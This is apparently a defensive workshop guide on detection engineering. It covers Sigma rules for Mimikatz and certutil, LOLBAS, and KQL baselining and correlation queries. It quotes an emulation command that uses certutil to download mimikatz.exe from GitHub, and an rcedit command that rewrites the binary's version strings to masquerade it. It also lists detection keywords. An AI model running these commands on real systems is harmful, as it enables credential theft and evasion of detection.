# Detection analysis
In this section, we'll review opportunities in the workshop and approaches in general to improve the effectiveness of our detection apparatus. 

## What do we actually look for

Let's review two cases and what they rely on.
### The obvious: Mimikatz 
| # | Search | ATT&CK Techniques | Notes | Dependencies |
|---|--------|-------------------|-------|--------------|
| 3 | [file_event_win_hktl_mimikatz_files.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/file/file_event/file_event_win_hktl_mimikatz_files.yml#L4) | [T1558](https://attack.mitre.org/techniques/T1558) | File extensions, operator decisions, hardcoded behavior of an open source tool | File writes being logged (Security 4663 OR EDR hooks)|
| 21 | [sysmon_mimikatz_detection_lsass.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/deprecated/windows/sysmon_mimikatz_detection_lsass.yml#L4) | [T1003](https://attack.mitre.org/techniques/T1003) | Already has silenced normal behavior allowing services and apps, which can be tampered with | Legacy environment, Non default noisy auditing of access |
| 23 | [win_alert_mimikatz_keywords.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/builtin/win_alert_mimikatz_keywords.yml#L4) | [T1003.001](https://attack.mitre.org/techniques/T1003/001), [T1003.002](https://attack.mitre.org/techniques/T1003/002), [T1003.004](https://attack.mitre.org/techniques/T1003/004), [T1003.006](https://attack.mitre.org/techniques/T1003/006) | Keywords found in CLI only, operator decisions, hardcoded behavior of an open source tool | CLI args logging in 4688, 4663 auditing |

### More subtle: Certutil
| # | Search | ATT&CK Techniques | Notes | Dependencies |
|---|--------|-------------------|-------|--------------|
| 5 | [net_connection_win_certutil_initiated_connection.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml#L2) | [T1105](https://attack.mitre.org/techniques/T1105) | two caracteristics under attacker control: the image filename ending with certutil.exe, and specific ports associated with SMB or HTTP traffic | CLI args logging in 4688, Process name (not PID) in Network event (i.e. not the windows firewall) |
| 12 | [proc_creation_win_certutil_download_file_sharing_domains.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml) | [T1027](https://attack.mitre.org/techniques/T1027) |two caracteristics under attacker control: the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data (very selective), commandline arguments looking for known domains for filesharing, assuming there is no Open redirectors in place as part of the delivery. | We've added a dependency on Sysmon due to the presence of original filename | 
| 13 | [proc_creation_win_certutil_download.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download.yml#L2) | [T1027](https://attack.mitre.org/techniques/T1027)  |two caracteristics under attacker control: the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data (very selective), commandline arguments looking for HTTP specifically (not SMB) and a specific verb ('urlcache ' or 'verifyctl '). | CLI args logging in 4688 | 

### Why LOLBAS are so challenging
In many environments, the use of certutil.exe is relatively rare. It is a so-called LOLBIN - Living Off the Land Binary, part of the bigger [LOLBAS (Applications and Scripts) family](https://lolbas-project.github.io/) and [GTFOBINS for linux](https://gtfobins.github.io/). Certutil's value for a threat actor lies in the fact that is signed by Microsoft and already installed. Exploit developers often think in terms of "primitives" e.g. [the write what where CWE](https://cwe.mitre.org/data/definitions/123.html). These primitives can be considered a ["feature" or "capability"](https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md#criteria) that the authors will not need to develop and embed in their toolkit to achieve their objectives. Detection opportunities for LOLBAS are multiple, and can yield some false positives as well as strong signals when the environment is known, since the binaries are most of the time used legitimately. 

## What can we do better?
Three main approaches can help with a detector's performance:
- improve the logic
- allowlist known-good events, by creating a baseline of True Positive Benign
- correlate events across sources, this can eliminate False Positive events

However, each of these approaches incurrs additional effort and you should apply them strategically for high value detection use cases. For example, assuming that new techniques for initial access will appear regularly, detections should be more robust on the post exploitation tactiques and techniques. In many cases, a complementary deception strategy focused around relevant TTPs will be the cheapest way forward. 

In the workshop, you may encounter false negatives as some detection rules are dependent on the operator's objective and behavior. This means our _recall_ may be insufficient overall. The rules may be too precise. A lot of events are collected and hold additional, untapped signals. We should consider many broader (more _recall_), potentially overlapping detections, acting as failover for rules which are too specific or _precise_. 


### Beware of what is under attacker control
The threat actor chose to use LOLBIN as part of their tooling. Rules triggered by elements under attacker control are likely to have a shorter lifetime than those based on behaviors, we need to know where we are on the Pyramid of Pain. The TTPs vary in terms of complexity (resulting in greater stealth) and associated detection opportunities ( identify a behavior rather than a signature such as filename or checksum). Let's dissect what was ran to emulates some of the threat actor activities. 
```
[ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
```
### Good old strings
In your Log analytics workspace, search for the following strings
- "m.exe"
- "delpy"
- "mimikatz"
- "powershell"

```
Event
| where * has "m.exe"
```

Looking for hacking tool strings and names without specifying a field or index can be a very easy way to have a fallback "catch all", exposing a lot of OPSEC failures. However, false positives are definitely going to happen. Accept this - treat them as triggers for enrichments, rather than an actionable alert - they should be consumed by a machine. 

#### Caveat
Strings are under attacker control. Recompiling or reproducing a subset of features of Mimikatz is notoriously sufficient to bypass many public detection rules around the tool, but not its behavior. A particular tool is [rcedit](https://github.com/electron/rcedit/releases) which can manipulate [version information strings]( https://learn.microsoft.com/en-us/windows/win32/menurc/versioninfo-resource?redirectedfrom=MSDN```). 

``` C:\Temp\rcedit.exe C:\Temp\m.exe --set-version-string OriginalFileName "miminomore.exe" --set-version-string FileDescription "You'll never catch me" --set-version-string ProductName "miminomore"```

Replacing this from the known bad string, mimikatz.exe, to an unknown string, miminomore.exe, or further to a known good string, such as intunesync.exe or svchost.exe would blend in even more - a process known as [Masquerading](https://attack.mitre.org/techniques/T1036/). Luckily, any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry on disk, loaded in memory in lsass or lsaiso, or in the Windows registry in memory. Behaviors are unfortunately less often detectable using native logs, and this is where EDRs come in, by inspecting aka "hooking" select system APIs or consuming native providers (ETW). We have to go up in the pyramid of pain.

### Looking at anomalies (i.e. baselining behaviors at scale, big or small)

#### Frequency analysis of Process attributes
As part of the threat emulation, powershell.exe was spawned. Frequency analysis focusing on rare events tied to this process can yield some results. 
```
_ASim_ProcessEvent_Create() 
| where CommandLine has "powershell" 
| summarize Events=count() by Dvc, CommandLine, TargetProcessCurrentDirectory 
| where Events < 5
```

Breaking this query down, we are focused on anomalies tied to powershell.

`_ASim_ProcessEvent_Create()` selects the normalized tabular data related to process creation events

`| where CommandLine has "powershell" ` finally the search term we care about

`| summarize Events=count() by Dvc, CommandLine, TargetProcessCurrentDirectory` groups and aggregates events by device, commandline arguments, and working directory. 

`| where Events < 5` filters the aggregation for the combination of host, commandline, and working directory which returned more than 5 events for this tuple.

As is, the search will yield a lot of activity from Ansible due to the provisioning of the lab. You should consider narrowing down the results around a time frame.

`| where TimeGenerated > ago(3h) and TimeGenerated < ago(2h)` would select events from a finite time frame. The aggregation time window should be aligned with the frequency of the search execution. 

Provisioning activity can be relatively rare in a productive environment. You could exclude more terms easily using, or exclude hosts which have an installation date from less than 4 hours.
Congratulations! You are now adding "Friendly intelligence" in your detections, which can get messy. 
The use of centralized, version controlled, external resources is recommended. 

`| where NOT * has "Administrator@attackrange.local"` 
`| where NOT * has "Ansible@attackrange.local"`

:rotating_light: As a sidenote, it is more and more common for threat actors to get access to SIEMs and EDRs. This friendly intelligence can be weaponized to fly under the radar.

With some additional logging or manual review during the emulation, process structures like [Jobs](https://learn.microsoft.com/en-us/windows/win32/procthread/job-objects) can also be a precious indication of something unusual.

:rotating_light:[Spoiler task manager details](images/powershell_spawned_at_step_10.png):rotating_light: 
Can you find details in raw events to build a detection based off this observation?

#### Caveat
We are focused on the behavior of powershell.exe, with the following assumptions:
- Process events have commandline logging enabled (remember that some organizations advise against CLI logging) 
- the binary was not renamed, which would imply pre-existing control over the system (i.e. dropped or copied binary, some control over the file system)
- the anomaly has happened within a specific timeframe
- the process powershell is the legitimate one (and not renamed mimikatz)
- the capabilities of powershell exposed through the System.Automation.DLL is not being loaded in a different process. Unmanaged powershell activity would need a different detection rule entirely.

### Baselining query to keep track of the computers running powershell per location per CLI args

```
Event 
| where EventID == 1 //Sysmon Dependency for process creation including the CLI and the CWD
| where * has "powershell.exe" //in any field of the event
| extend EventXml = parse_xml(EventData) 
| mv-expand Data = EventXml.DataItem.EventData.Data
| extend Name = tostring(Data["@Name"]), Value = tostring(Data["#text"])
| summarize EventDataBag = make_bag(pack(Name, Value)) by TimeGenerated, Computer, EventID, EventLog
| where EventDataBag.Image=="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" //refine the search based on a field value match
| summarize Computers=make_set(Computer), CountComputers=dcount(Computer) by tostring(EventDataBag.CommandLine), tostring(EventDataBag.CurrentDirectory) 
```

### Windows logon behavior outliers
As a process is emitting a login with the SecLogon Login mechanism, a 4624 event gets generated. Not many attributes are seen with two different target accounts 
```
Event
| where EventID == 4624
| extend EventXml = parse_xml(EventData) 
| mv-expand Data = EventXml.DataItem.EventData.Data
| extend Name = tostring(Data["@Name"]), Value = tostring(Data["#text"])
| summarize EventDataBag = make_bag(pack(Name, Value)) by TimeGenerated, Computer, EventID, EventLog
| where tostring(EventDataBag.TargetUserName)!=tostring(EventDataBag.TargetOutboundUserName) and EventDataBag.TargetOutboundUserName!="-" 
```

## Embrace True Positive Benign and False positives
Reducing the cost of handling a false positive alert is key to make sure your team doesn't burn out. Each detection should have guidance on how to be triaged to avoid paralysis analysis.

According to statistics definition, _Precision_ measures the accuracy of positive predictions, while _recall_ measures the ability of the model to find all relevant instances. 
In our case, this means that we need to find the balance between detections that may be too specific and occur false negatives, and detections that may be too broad and cause attrition issues. 

:rotating_light: False Positives will happen and should not be seen as a big deal :rotating_light:

The triage differenciation is the hard work you need to perform, luckily only once, as you establish the detection. It is where correlation kicks in, as it is often required to run multiple queries in parallel - ideally as a "playbook" - when reviewing events with low fidelity, effectively treating them as triggers rather than a final product. A single event should not be enough to create an incident, but a series of small signals should.

### Notable events and correlation
While sigma rules can be a great start to quickly cover common use cases, it also suffers from the same constraints as vendor provided detections. Most organizations load entire rulesets and hope for the best, then under pressure end up turning off rules which are prone to false positives or true positive benigns. The approach we would recommend is not to disable unreliable rules but handle their output differently. The concept of "Notables events", is effective at reducing alert fatigue. Using a correlation rule, multiple events of low fidelity can be assigned a score. Once a certain score per system or entity is reached, an incident can be created. This concept can be recreated with limited effort from scratch, allowing your team to focus on stronger signals from specific analytics and deprioritizing response time and closure criteria of notables. 
Retaining information to trigger further analysis, or retain context for potential investigations in the future. For example, scores can reflect importance:
- renamed binary = 5 points
- file written to disk = 5 points
- sensitive registry read = 10 points
- privilege logon event = 10 points

Azure support the approach by using Summary rules, with different flavors and quotas. Having this mechanism in place can be an easy way to track notables.
[Azure summary rules quotas](https://learn.microsoft.com/en-us/azure/sentinel/datalake/kql-jobs-summary-rules-search-jobs#feature-comparison)

Going back to the previous example of powershell CLI outliers, this query can be used to identify hourly what systems have ran a specific powershell commandline - ready for summarization using the value of that field.
```
Event
| where TimeGenerated > ago(1h) // Adjust the schedule frequency
| where * has ("powershell.exe") or * has ("pwsh.exe")
| extend EventXml = parse_xml(EventData) 
| mv-expand Data = EventXml.DataItem.EventData.Data
| extend Name = tostring(Data["@Name"]), Value = tostring(Data["#text"])
| summarize EventDataBag = make_bag(pack(Name, Value)) by TimeGenerated, Computer, EventID, EventLog
| where EventDataBag.Image=="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" 
| summarize // Aggregate the data
    EventCount = count(),
    UniqueSources = dcount(Computer),
    Computers = make_set(Computer),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by bin(TimeGenerated, 1h), tostring(EventDataBag.CommandLine)
```

For guidance on how to set up a summary rule, as this is beyond the scope of the workshop, follow the official documentation here: [Azure summary rules setup](https://learn.microsoft.com/en-us/azure/sentinel/summary-rules)

```
PowerShellSummary_CL //the name of the table containing the events comes from the rule, with an automatic suffix of _CL
| where TimeGenerated > ago(30d)
| where EventCount > 50 and UniqueSources < 5
| project TimeGenerated, CommandLine, EventCount, UniqueSources
| render timechart sum(EventCount) by CommandLine
```

### Modernize (if needed) the way you search your data
Over time, you will likely notice the need to automatically enrich low fidelity events (e.g. perform a simple IP / Hostname PTR DNS lookup) in order to silence events. In effect, this post processing takes events out of [the funnel of fidelity](https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036?gi=7043a4a42b18).
- Get used to leverage APIs and macros for your queries
- Script and parameterize your queries.
- Convert queries to "tests" supporting Quality Assurance around your pipeline

### Build baselines and a reusable knowledge base 
Baselining can apply against broad or specific types of events such as kerberos service ticket issuance. 
- Who is requesting service tickets? 
- Which principals are running services where? 
Over time, the amount of noise will decrease, and you will be able to lower thresholds for alerts. 

Baselining who is using what in your environment is an important step, as well as the intended use of tools and CLI args. As analysts map out the environment and what is "normal" - store this information in a knowledge base. Examples can be :
- Sentinel watchlists
- external files
- Github repos

Whenever possible, it is recommended to retain this information outside of EDR, SIEMs and SOARs to facilitate reuse across the enterprise, and vendor or technology transitions.


## Takeaways
We've demonstrated a couple example of detection opportunities and approaches which were not provided as part of common detection rulesets, as they rely on anomalies and have a low "Precision". Building a handful of detections with high "Recall" can help as searching data is often relatively cheap, depending on the technologies available to you. 

Consider many broader potentially overlapping detections, acting as failover for rules which may be too specific. In our workshop, a simple example approach would be to looking for hacking tool strings and names. 

Treat false positives as happy little accidents, considering them as triggers for enrichments rather than a final product. 

To complement or compensate for faulty detections for complicated scenarios, you will maybe need to turn to canaries and other early warning systems. 

Always assume that bypasses of your detections are possible and establish regular testing scenarios.


## Target practice
### PSExec
If you're up for a take home challenge, try to determine who is using PSEXEC in your environment, if any, and why.
 - is it to run code as system?
 - is it to run code on a remote system?
 - Can you easily detect usage of the legitimate, original PSExec binaries?
Later on, try and move up the pyramid based on the behaviors:
 - What about the clones of PSEXEC (PAExec, RMMs) using the same primitives? 
 - What services get created, started or stopped? 
 - What users create a service remotely using the Service Control Management API?

### BETA - RMM hunting - loading an external data set
[LOLRMM CSV holds information about the RMM seen in the wild](https://lolrmm.io/api/rmm_tools.csv). Try and use this as an example for things to block, or consider controlling within your environment. Threat actors use signed software and RMMs for their intrusions and the presence of such tools must be legitimate. 
Similarly, the LOLBAS project has a list of utilities organized in a CSV file. [LOLBAS CSV](https://lolbas-project.github.io/api/lolbas.csv)
```
Event 
| where EventID == 1
| extend EventXml = parse_xml(EventData) 
| mv-expand Data = EventXml.DataItem.EventData.Data
| extend Name = tostring(Data["@Name"]), Value = tostring(Data["#text"])
| summarize EventDataBag = make_bag(pack(Name, Value)) by TimeGenerated, Computer, EventID, EventLog
| where EventDataBag has_any (externaldata(Name:string,Category:string,Description:string,Author:string,Created:string,LastModified:string,Website:string,Filename:string,OriginalFileName:string,PEDescription:string,Product:string,Privileges:string,Free:string,Verification:string,SupportedOS:string,Capabilities:string,Vulnerabilities:string,InstallationPaths:string,Artifacts:string,Detections:string,References:string,Acknowledgement:string)
[
    @"https://lolrmm.io/api/rmm_tools.csv"
]
with (format="csv", ignoreFirstRecord=true) | project Filename | where isnotempty(Filename)
    | distinct Filename)
```

## References
[MITRE Attack Detection video about improving analytics - mad20.io](https://www.youtube.com/watch?v=bVI6WkfY334)

[Microsoft Job objects](https://learn.microsoft.com/en-us/windows/win32/procthread/job-objects)

[SpecterOps - Introducing the Funnel of Fidelity - 2019](https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036)

[LOLRMM Project](https://lolrmm.io/)

[LOLBAS Project](https://lolbas-project.github.io/)

[GTFOBins](https://gtfobins.github.io/)

[MITRE Common Weakness Enumerations](https://cwe.mitre.org/)

[RCEdit](https://github.com/electron/rcedit/releases)

[Microsoft - PE Version information resources](https://learn.microsoft.com/en-us/windows/win32/menurc/versioninfo-resource)
